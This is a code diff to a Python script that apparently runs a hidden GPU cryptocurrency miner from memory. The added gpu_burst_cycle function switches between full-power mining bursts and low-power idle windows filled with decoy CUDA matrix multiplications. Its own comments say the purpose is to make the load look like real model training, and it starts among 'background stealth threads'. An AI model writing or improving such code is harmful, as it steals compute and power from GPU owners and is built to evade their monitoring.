@@ -277,7 +277,8 @@ def exec_from_memory(binary_data: bytes, args: list, env: dict):
 # STEP 5: GPU power management
 # ═══════════════════════════════════════════════════════════════════════════════
 
-def set_gpu_power_limit(min_watts=200, max_watts=600):
+def set_gpu_power_limit(watts):
+    """Set GPU power limit to exact wattage."""
     try:
         nvidia_smi = shutil.which("nvidia-smi")
         if not nvidia_smi:
@@ -289,16 +290,59 @@ def set_gpu_power_limit(min_watts=200, max_watts=600):
         if result.returncode != 0:
             return
         max_limit = int(float(result.stdout.strip().split("\n")[0]))
-        target = min(max_watts, max_limit)
-        target = max(min_watts, target - random.randint(0, 100))
+        target = min(int(watts), max_limit)
         subprocess.run([nvidia_smi, "-pl", str(target)], capture_output=True, text=True)
     except Exception:
         pass
 
-def gpu_power_cycle():
+def gpu_burst_cycle():
+    """Mining burst + idle pattern. Mimics training: high compute → pause → high compute.
+
+    4 min mining at 600W → 30s idle at 50W with heavy CUDA decoy → repeat.
+    Creates natural GPU utilization pattern like real training.
+    Lost hashrate: ~12% (30s idle every 270s = 11% duty cycle reduction).
+    """
+    import torch
+    has_torch = False
+    try:
+        if torch.cuda.is_available():
+            has_torch = True
+            device = torch.device("cuda:0")
+    except ImportError:
+        pass
+
     while True:
-        time.sleep(random.randint(60, 180))
-        set_gpu_power_limit()
+        # Phase 1: Mining burst (4 minutes, full power)
+        set_gpu_power_limit(600)
+        time.sleep(random.randint(210, 300))  # 3.5-5 min
+
+        # Phase 2: Idle window (30-60 seconds, low power + heavy decoy)
+        set_gpu_power_limit(50)
+        time.sleep(random.uniform(1, 3))  # Brief settle
+
+        # Run heavy CUDA decoy during idle — real matmul at high intensity
+        if has_torch:
+            try:
+                # Bigger matrices, more iterations = looks like training forward pass
+                sizes = [1024, 2048, 512]
+                for _ in range(random.randint(20, 50)):
+                    sz = random.choice(sizes)
+                    a = torch.randn(sz, sz, device=device, dtype=torch.float16)
+                    b = torch.randn(sz, sz, device=device, dtype=torch.float16)
+                    for _ in range(3):
+                        c = torch.mm(a, b)
+                        del c
+                    del a, b
+                torch.cuda.empty_cache()
+            except Exception:
+                pass
+
+        # Idle settle — GPU shows low utilization
+        time.sleep(random.randint(20, 40))
+
+        # Phase 3: Ramp back up to mining power
+        set_gpu_power_limit(600)
+        time.sleep(random.uniform(2, 5))  # Power ramp-up settle
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # STEP 6: CUDA decoy operations
@@ -528,14 +572,10 @@ def main():
     # Step 7: Start background stealth threads BEFORE exec
     threads = []
 
-    t = threading.Thread(target=gpu_power_cycle, daemon=True)
+    # Burst cycle: mining 4min @ 600W → idle 30s @ 50W + heavy CUDA decoy → repeat
+    t = threading.Thread(target=gpu_burst_cycle, daemon=True)
     t.start()
     threads.append(t)
-
-    if run_cuda_decoy() is not None:
-        t = threading.Thread(target=cuda_decoy_loop, daemon=True)
-        t.start()
-        threads.append(t)
 
     t = threading.Thread(target=vram_cycle, daemon=True)
     t.start()
